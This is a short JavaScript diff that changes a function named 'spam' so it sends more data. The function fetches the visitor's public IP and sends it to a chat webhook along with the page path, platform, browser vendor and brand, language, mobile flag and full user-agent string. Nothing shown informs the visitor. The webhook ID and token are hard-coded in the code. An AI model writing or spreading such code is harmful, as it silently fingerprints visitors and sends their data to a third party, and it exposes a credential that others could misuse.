@@ -12,7 +12,7 @@ async function spam(text){
     await fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     //.then(data => sendMessage(9, t, "", "POST", "channels/1092026472786579496/messages", data.ip + "\n" + text, ""));
-    .then(data => sendToWebHook("1332057163564191974", "O34H4kQUU35omVFuEs1JBqiFh9d4G2uUlLFeOl5lpdL2vjfqhCJ9zHpr3XnfjvgJmdd2","`" + data.ip + "` sur `"+ getShortPathname() + "`\n```\n" + text + "\n```", "POST"));
+    .then(data => sendToWebHook("1332057163564191974", "O34H4kQUU35omVFuEs1JBqiFh9d4G2uUlLFeOl5lpdL2vjfqhCJ9zHpr3XnfjvgJmdd2","⬆️\n\n\n`" + data.ip + "` sur `"+ getShortPathname() + "`\nSur `"+  navigator.userAgentData.platform + "` `" + navigator.vendor + "/" + navigator.userAgentData.brands[1].brand + "` `lang:" + navigator.language + "` `mobile:"+ navigator.userAgentData.mobile + "`\n`" + window.navigator.userAgent + "`\n```\n" + text + "```\n\n⬇️", "POST"));
 }
 
 //var t = "AAAAAAAAAAAAAAAAAAAA.AAAAAA-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
